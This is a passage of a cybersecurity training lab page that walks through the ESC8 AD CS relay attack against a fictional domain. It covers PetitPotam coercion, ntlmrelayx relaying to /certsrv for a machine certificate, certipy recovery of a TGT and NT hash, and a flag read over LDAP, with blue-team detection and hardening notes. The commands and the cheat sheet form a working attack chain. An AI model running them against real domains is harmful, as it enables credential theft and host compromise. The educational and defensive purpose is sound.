+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>certipy<span class="w"> </span>auth<span class="w"> </span>-pfx<span class="w"> </span>machine.pfx<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;dc_ip&gt;
+</code></pre></div>
+<p>Output: machine TGT cached, machine NTLM hash printed.</p>
+<hr />
+<h2 id="walkthrough">Walkthrough</h2>
+<h3 id="step-1-confirm-targets">Step 1: Confirm Targets</h3>
+<p>A two-target attack needs two reachability checks. The CA must be alive and accepting NTLM at <code>/certsrv</code>; the victim must be reachable on the RPC endpoint mapper (TCP 135) so PetitPotam can call EFSRPC.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Verify CA web enrollment is up</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>curl<span class="w"> </span>-I<span class="w"> </span>http://corp-ca01.corp.nordport.local/certsrv/<span class="w"> </span>-u<span class="w"> </span>j.chen:<span class="s1">&#39;Welcome2026#&#39;</span>
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-I</code></td>
+<td>HEAD request only; no body.</td>
+</tr>
+<tr>
+<td><code>-u user:pass</code></td>
+<td>Inline HTTP auth credentials.</td>
+</tr>
+</tbody>
+</table>
+<p>Expect a <code>HTTP/1.1 401 Unauthorized</code> first (NTLM challenge), then <code>HTTP/1.1 200 OK</code> once curl handles the NTLM dance. Confirms /certsrv is reachable and uses NTLM/Negotiate. If you see <code>HTTPS-only</code>, the site is hardened and ESC8 will not work.</p>
+</div>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Verify victim is up</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>nc<span class="w"> </span>-w<span class="w"> </span><span class="m">5</span><span class="w"> </span>mssql01_<span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span>.corp.nordport.local<span class="w"> </span><span class="m">135</span><span class="w"> </span>&lt;/dev/null
+</code></pre></div>
+<p>A clean exit (exit code 0) means TCP 135 is open. The PetitPotam coerce uses an RPC interface served by the endpoint mapper.</p>
+</div>
+<h3 id="step-2-start-the-relay-listener">Step 2: Start the Relay Listener</h3>
+<p>ntlmrelayx is the listener. It binds SMB (TCP 445) and HTTP (TCP 80) and waits for inbound NTLM authentications. Each captured authentication is forwarded to the configured target. Run it in its own terminal so you can see the relay logs in real time.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - ntlmrelayx, AD CS mode</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>sudo<span class="w"> </span>ntlmrelayx.py<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="w">  </span>-t<span class="w"> </span><span class="s2">&quot;http://corp-ca01.corp.nordport.local/certsrv/certfnsh.asp&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="w">  </span>--adcs<span class="w"> </span>--template<span class="w"> </span>Machine<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="w">  </span>-smb2support<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="w">  </span>-output-file<span class="w"> </span>machine
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-t &lt;url&gt;</code></td>
+<td>Relay target. <code>certfnsh.asp</code> is the IIS endpoint that processes a CSR.</td>
+</tr>
+<tr>
+<td><code>--adcs</code></td>
+<td>After relay succeeds, request a certificate using the relayed identity.</td>
+</tr>
+<tr>
+<td><code>--template Machine</code></td>
+<td>Default-published Machine template; allows Domain Computers to enroll.</td>
+</tr>
+<tr>
+<td><code>-smb2support</code></td>
+<td>Accept SMB2 inbound (most modern Windows speaks SMB2 by default).</td>
+</tr>
+<tr>
+<td><code>-output-file machine</code></td>
+<td>Write the captured cert to <code>machine.pfx</code> (extension auto-applied).</td>
+</tr>
+</tbody>
+</table>
+<p>The listener opens on TCP/445 and TCP/80 by default. Wait for incoming auth.</p>
+</div>
+<h3 id="step-3-trigger-the-coercion">Step 3: Trigger the Coercion</h3>
+<p>PetitPotam calls the EFSRPC interface on the victim with a UNC path argument pointing at your Kali. The victim's LSA dutifully tries to access that path, and the access requires authentication; the LSA sends the machine account's Net-NTLMv2 over SMB to your Kali. The relay listener catches that auth and forwards it to /certsrv.</p>
+<p>In a second terminal:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - PetitPotam</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="nv">KALI_IP</span><span class="o">=</span><span class="k">$(</span>ip<span class="w"> </span>-4<span class="w"> </span>-o<span class="w"> </span>addr<span class="w"> </span>show<span class="w"> </span>eth0<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $4}&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d/<span class="w"> </span>-f1<span class="k">)</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>PetitPotam.py<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$KALI_IP</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;mssql01_</span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">.corp.nordport.local&quot;</span>
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Token</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ip -4 -o addr show eth0</code></td>
+<td>Print one-line IPv4 addresses for eth0.</td>
+</tr>
+<tr>
+<td><code>awk '{print $4}'</code></td>
+<td>Field 4 is the CIDR-notation address.</td>
+</tr>
+<tr>
+<td><code>cut -d/ -f1</code></td>
+<td>Strip the <code>/24</code> suffix; we want just the IP.</td>
+</tr>
+<tr>
+<td><code>&lt;attacker_ip&gt;</code></td>
+<td>First positional: where the victim should authenticate to.</td>
+</tr>
+<tr>
+<td><code>&lt;victim_fqdn&gt;</code></td>
+<td>Second positional: the host to coerce.</td>
+</tr>
+</tbody>
+</table>
+<p>The output ends with <code>Trying to coerce... done!</code> or similar. Switch back to the ntlmrelayx terminal; you should see:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>[*] HTTPS server returned 200; Authenticated
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>[*] Got certificate for MSSQL01_&lt;TOKEN&gt;$@CORP.NORDPORT.LOCAL
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>[*] Saved certificate to machine.pfx
+</code></pre></div>
+</div>
+<h3 id="step-4-recover-the-machine-tgt-and-hash">Step 4: Recover the Machine TGT and Hash</h3>
+<p>The relayed cert is good for client authentication. PKINIT against the KDC uses the cert as proof-of-identity and returns a TGT for the machine account (and, on un-hardened DCs, the NT hash via PAC_CREDENTIAL_INFO).</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - certipy auth from the relayed cert</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>certipy<span class="w"> </span>auth<span class="w"> </span>-pfx<span class="w"> </span>machine.pfx<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;dc_ip&gt;
+</code></pre></div>
+<p>Output reports the machine principal (<code>MSSQL01_&lt;TOKEN&gt;$@CORP.NORDPORT.LOCAL</code>), TGT cached at <code>mssql01_&lt;TOKEN&gt;$.ccache</code>, and the NT hash for the machine account.</p>
+</div>
+<h3 id="step-5-read-the-per-token-flag">Step 5: Read the Per-Token Flag</h3>
+<p>The machine account itself has read access on its own object's attributes. Three equivalent paths to read the flag attribute follow; pick the one that matches what your DC accepts.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - LDAP query as the machine account</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="nv">TOK</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s1">&#39;a-z&#39;</span><span class="w"> </span><span class="s1">&#39;A-Z&#39;</span><span class="k">)</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-LLL<span class="w"> </span>-H<span class="w"> </span>ldap://corp-dc01<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="w">  </span>-D<span class="w"> </span><span class="s2">&quot;MSSQL01_</span><span class="si">${</span><span class="nv">TOK</span><span class="si">}</span><span class="nv">$@</span><span class="s2">corp.nordport.local&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="w">  </span>-w<span class="w"> </span><span class="s1">&#39;&lt;NT hash from certipy&gt;&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="w">  </span>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=nordport,DC=local&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="w">  </span><span class="s2">&quot;(name=MSSQL01_</span><span class="si">${</span><span class="nv">TOK</span><span class="si">}</span><span class="s2">)&quot;</span><span class="w"> </span>extensionAttribute3
+</code></pre></div>
+<p>Some LDAP clients reject NT-hash-as-password for simple binds; alternative is to use the cached TGT:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="s2">&quot;mssql01_</span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">\$.ccache&quot;</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>ldapsearch<span class="w"> </span>-Y<span class="w"> </span>GSSAPI<span class="w"> </span>-LLL<span class="w"> </span>-H<span class="w"> </span>ldap://corp-dc01<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="w">  </span>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=nordport,DC=local&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="w">  </span><span class="s2">&quot;(name=MSSQL01_</span><span class="si">${</span><span class="nv">TOK</span><span class="si">}</span><span class="s2">)&quot;</span><span class="w"> </span>extensionAttribute3
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-Y GSSAPI</code></td>
+<td>Use GSSAPI/Kerberos for the bind (instead of <code>-x</code> simple).</td>
+</tr>
+<tr>
+<td><code>KRB5CCNAME=&lt;file&gt;</code></td>
+<td>Point GSSAPI at the cached TGT.</td>
+</tr>
+</tbody>
+</table>
+<p>Or, simplest, use netexec with the recovered hash:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>netexec<span class="w"> </span>ldap<span class="w"> </span>corp-dc01<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="w">  </span>-u<span class="w"> </span><span class="s2">&quot;MSSQL01_</span><span class="si">${</span><span class="nv">TOK</span><span class="si">}</span><span class="s2">\$&quot;</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;&lt;NT hash&gt;&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="w">  </span>-d<span class="w"> </span>corp.nordport.local<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="w">  </span>--query<span class="w"> </span><span class="s2">&quot;(name=MSSQL01_</span><span class="si">${</span><span class="nv">TOK</span><span class="si">}</span><span class="s2">)&quot;</span><span class="w"> </span>extensionAttribute3
+</code></pre></div>
+<p>The attribute value is your flag.</p>
+</div>
+<div class="admonition warning">
+<p class="admonition-title">Common gotchas</p>
+<ul>
+<li><strong>Listener bind failure</strong>: ntlmrelayx fails to bind 445 if your Kali is running Samba. <code>sudo systemctl stop smbd nmbd</code> before launching.</li>
+<li><strong>Coerce fires but no relay</strong>: ntlmrelayx logs "Authentication received" but no cert appears. Common causes: the target /certsrv is HTTPS-only (HTTPS scheme needed); the IIS site has EPA enforced (relay fails channel binding); the Machine template is disabled or not auto-published.</li>
+<li><strong><code>MSSQL01</code> vs <code>mssql01</code></strong>: PetitPotam works either case, but ntlmrelayx logs the case as the LSA sent it. The pfx filename is lowercase; the AD object name is uppercase. Use <code>tr</code> to upper-case when querying AD.</li>
+<li><strong>PetitPotam patched</strong>: try <code>coercer coerce -t &lt;victim&gt; -l &lt;kali_ip&gt;</code> instead; coercer cycles through every known method.</li>
+<li><strong>NT hash format</strong>: certipy prints the hash as <code>&lt;lm&gt;:&lt;nt&gt;</code>. Use only the second segment (the NT half) with netexec's <code>-H</code>.</li>
+</ul>
+</div>
+<hr />
+<h2 id="blue-team-perspective">Blue Team Perspective</h2>
+<p>ESC8 leaves three distinct breadcrumbs across three hosts. Defenders that correlate them catch this attack reliably.</p>
+<table>
+<thead>
+<tr>
+<th>Activity</th>
+<th>Event ID</th>
+<th>Where it fires</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Inbound NTLM auth from machine to attacker IP</td>
+<td>4624 logon type 3 (anonymous-ish)</td>
+<td>DC + victim Security log</td>
+</tr>
+<tr>
+<td>Cert issued to coerced machine</td>
+<td>4886, 4887</td>
+<td>CA Security log</td>
+</tr>
+<tr>
+<td>PetitPotam-style RPC call</td>
+<td>RPC filters / EDR</td>
+<td>Victim host</td>
+</tr>
+<tr>
+<td>PKINIT logon from machine cert</td>
+<td>4768 with <code>Certificate Issuer Name</code></td>
+<td>DC Security log</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition info">
+<p class="admonition-title">What detects ESC8 fastest</p>
+<p>A SIEM rule that joins on machine identity catches ESC8 without needing rare events: alert when the same machine SAM appears in (a) an unusual outbound NTLM auth and (b) a cert issuance from the CA within 60 seconds. That correlation has near-zero false positives.</p>
+</div>
+<h2 id="hardening-note">Hardening Note</h2>
+<p>KB5005413 published the canonical mitigations. Apply all three layers; defense in depth matters here because each individual mitigation has been bypassed.</p>
+<div class="admonition tip">
+<p class="admonition-title">ESC8 hardening</p>
+<ul>
+<li>Enable <strong>HTTPS-only</strong> on <code>/certsrv</code> (disable HTTP at the IIS binding level).</li>
+<li>Enable <strong>EPA (Extended Protection for Authentication)</strong> on the /certsrv IIS site; channel-binds NTLM to the TLS channel.</li>
+<li>Apply <strong>RPC filters</strong> blocking PetitPotam, PrinterBug, ShadowCoerce, DFSCoerce coercion methods.</li>
+<li>Disable NTLM on internal-facing services that can be moved to Kerberos-only.</li>
+<li>Enforce <strong>SMB signing required</strong> so coerced auths are not relayable to SMB targets either.</li>
+<li>Forward CA event logs (4886/4887) to the SIEM with retention for slow-burn abuse.</li>
+</ul>
+</div>
+<hr />
+<h3 id="record-your-findings">Record Your Findings</h3>
+<blockquote>
+<p><strong>Coerced machine:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>MSSQL01_&lt;TOKEN&gt;
+</code></pre></div>
+<p><strong>Cert obtained:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>machine.pfx (Machine template, valid for client auth)
+</code></pre></div>
+<p><strong>Recovered NT hash:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>(32-hex-char NTLM hash of MSSQL01_&lt;TOKEN&gt;$)
+</code></pre></div>
+<p><strong>Flag:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>(OCR{esc8_...})
+</code></pre></div>
+</blockquote>
+<hr />
+<h2 id="analysis-questions">Analysis Questions</h2>
+<p><strong>1. KB5005413 documents three layers of mitigation: HTTPS-only, EPA, and RPC filters that block the coercion methods. Which is the strongest, and why is the chain often only partially mitigated in production?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>The strongest single mitigation is <strong>EPA (Extended Protection for Authentication) on the IIS /certsrv site combined with HTTPS-only</strong>. EPA channel-binds the NTLM authentication to the TLS channel, so an attacker cannot relay a session captured on one transport (SMB inbound) to another transport (HTTP outbound to /certsrv) without breaking the channel binding. With EPA enforced and HTTPS-only, the relay step fails regardless of whether coercion succeeded. RPC filters that block PetitPotam-style coercion are useful but incomplete: every blocked method has a successor (PetitPotam -&gt; ShadowCoerce -&gt; DFSCoerce -&gt; CheeseOunce -&gt; ...). In production the chain is often partially mitigated because: (a) enabling HTTPS on /certsrv requires a cert chain configuration that some teams have not done, (b) EPA breaks some legacy enrollment scripts that did not handle channel binding, (c) RPC filters require regular maintenance as new coercion methods are published. The pragmatic recommendation is the layered approach: do all three.</p>
+</details>
+<p><strong>2. The relayed machine account has a 240-byte random password. The attack does not crack the password; it captures a usable certificate. What does the cert give you that the password (if you had it) would not?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>The cert and the machine password give you the same authentication capability against AD: both yield a usable Kerberos TGT for the machine account, which can read the machine's own attributes, perform any operation the machine is configured to perform, and (critically) is often a stepping stone to local SYSTEM on the host itself via S4U2self. The advantage of the cert: (a) it persists across machine password rotations; the cert remains valid for its lifetime (typically 1 year for Machine templates) regardless of what happens to the password; (b) you obtain the cert without ever needing to read or compute the password, so the chain works even if the machine's keytab is unrecoverable; (c) some downstream protocols (PKINIT, smartcard logon, certain RDP modes) accept the cert directly without converting back to NTLM. So the cert is strictly more flexible. For long-term persistence on a compromised machine account, an attacker who could recover the password might still go through the cert path explicitly because the cert outlasts the password rotation.</p>
+</details>
+<p><strong>3. The machine's NTLM hash is printed by <code>certipy auth</code>. With the machine hash, what can the attacker do to the underlying host?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>A lot. The machine hash is the LSA secret for the host's machine account. An attacker with the hash can: (a) compute a Silver Ticket forging a TGS for any service running as the machine account (typically <code>cifs/&lt;host&gt;</code>, <code>host/&lt;host&gt;</code>, <code>RPCSS/&lt;host&gt;</code>); (b) authenticate to the host as the machine itself, which has access to its own LSA secrets and can extract every cached credential; (c) S4U2self via the machine to impersonate any user (computer accounts have implicit T2A4D-like behavior for self-targeted services); (d) decrypt DPAPI-protected secrets stored in the machine context (Windows credentials saved as the SYSTEM account); (e) read the SAM database and recover any local account hashes. From the machine hash, local SYSTEM on the host is one Silver Ticket away, and from there the rest of the local machine state is open. ESC8 plus a juicy victim host is essentially full local compromise of that host plus a foothold for further lateral movement.</p>
+</details>
+<hr />
+<h2 id="key-takeaways">Key Takeaways</h2>
+<ul>
+<li>ESC8 = coerce + relay + AD CS web enrollment + no EPA.</li>
+<li>ntlmrelayx.py with <code>--adcs --template Machine</code> automates the relay-to-cert step.</li>
+<li>PetitPotam is the famous coercer; coercer.py tries every variant.</li>
+<li>The recovered machine cert yields a TGT and (on un-hardened DCs) the machine's NTLM hash.</li>
+<li>Mitigation: HTTPS + EPA on /certsrv, RPC filters blocking coercion methods, signing requirements.</li>
+</ul>
+<h2 id="cheat-sheet-recap">Cheat Sheet Recap</h2>
+<p>The four operations below run the entire ESC8 chain. Have two terminals open: one for the relay listener, one for the coercer.</p>
+<table>
+<thead>
+<tr>
+<th>Goal</th>
+<th>Command</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Start relay listener</td>
+<td><code>sudo ntlmrelayx.py -t "http://&lt;ca&gt;/certsrv/certfnsh.asp" --adcs --template Machine -smb2support -output-file machine</code></td>
+</tr>
+<tr>
+<td>Coerce victim (PetitPotam)</td>
+<td><code>PetitPotam.py &lt;kali_ip&gt; &lt;victim_fqdn&gt;</code></td>
+</tr>
+<tr>
+<td>Coerce victim (multi-method)</td>
+<td><code>coercer coerce -t &lt;victim_fqdn&gt; -u &lt;user&gt; -p '&lt;pw&gt;' -d &lt;domain&gt; -l &lt;kali_ip&gt;</code></td>
+</tr>
+<tr>
+<td>Recover TGT + hash from cert</td>
+<td><code>certipy auth -pfx machine.pfx -dc-ip &lt;dc&gt;</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="spaced-repetition">Spaced Repetition</h2>
+<p><strong>Card 1: ntlmrelayx ADCS Mode</strong></p>
+<p>Q: Write the ntlmrelayx command to relay incoming NTLM auth to <code>corp-ca01</code>'s certfnsh.asp endpoint, requesting a Machine-template cert.</p>
+<details class="note">
+<summary>Answer</summary>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>sudo<span class="w"> </span>ntlmrelayx.py<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="w">  </span>-t<span class="w"> </span><span class="s2">&quot;http://corp-ca01/certsrv/certfnsh.asp&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="w">  </span>--adcs<span class="w"> </span>--template<span class="w"> </span>Machine<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="w">  </span>-smb2support
+</code></pre></div>
+<p>Add <code>-output-file machine</code> to save the resulting cert as <code>machine.pfx</code>. Default listeners are TCP/80 and TCP/445; the coerced auth typically arrives on 445.</p>
+</details>
+<p><strong>Card 2: PetitPotam Trigger</strong></p>
+<p>Q: Write the PetitPotam command to coerce <code>mssql01.corp.local</code> to authenticate to your Kali at <code>10.10.10.99</code>.</p>
+<details class="note">
+<summary>Answer</summary>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>PetitPotam.py<span class="w"> </span><span class="m">10</span>.10.10.99<span class="w"> </span>mssql01.corp.local
+</code></pre></div>
+<p>Add <code>-u user -p pass -d corp.local</code> if the unauthenticated EFSRPC call has been patched and you need an authenticated context. Variants if PetitPotam alone fails: <code>coercer coerce -t mssql01.corp.local -l 10.10.10.99</code> tries every known coercion method.</p>
+</details>
+<p><strong>Card 3: Cert-to-Hash via certipy</strong></p>
+<p>Q: One command to recover a TGT and NTLM hash from a captured machine cert <code>machine.pfx</code>.</p>
+<details class="note">
+<summary>Answer</summary>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>certipy<span class="w"> </span>auth<span class="w"> </span>-pfx<span class="w"> </span>machine.pfx<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.10.10
+</code></pre></div>
+<p>Output: machine principal name, TGT cached at <code>&lt;sam&gt;$.ccache</code>, NTLM hash printed. On May-2022-hardened DCs the hash is no longer included; the TGT is still usable.</p>
+</details>
+<p><strong>Card 4: KB5005413 Three Mitigations</strong></p>
+<p>Q: List the three KB5005413 mitigations for ESC8.</p>
+<details class="note">
+<summary>Answer</summary>
+<ol>
+<li><strong>HTTPS-only on /certsrv</strong> (disable HTTP, force TLS). 2. <strong>EPA (Extended Protection for Authentication) on the IIS site</strong> (channel-bind NTLM to the TLS channel). 3. <strong>RPC filters that block the coercion methods</strong> (PetitPotam EFSRPC, PrinterBug, etc.). The first two prevent the relay step; the third prevents the coercion. Layered defense; do all three.</li>
+</ol>
+</details>
+<p><strong>Card 5: Why the Cert Outlasts the Password</strong></p>
+<p>Q: A relayed Machine cert is good for 1 year. Why is that more useful than the machine's password (which rotates every 30 days)?</p>
+<details class="note">
+<summary>Answer</summary>
+<p>Machine passwords rotate automatically every 30 days by default; an attacker who captured the password loses it at the next rotation. A cert is good for its full validity period (typically 1 year for Machine templates) regardless of password rotation, so the attacker has a stable identity for the machine for the cert's lifetime. The defender's response is to revoke the cert (CRL update) when the compromise is detected, but unless the defender knows the cert exists, it remains a working identity until expiration.</p>
+</details>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.sections", "navigation.expand", "navigation.top", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../javascripts/mermaid-fix.js?v=4"></script>
+      
+        <script src="../../javascripts/pdf-export.js?v=2"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+      
+    
+  </body>
+</html>
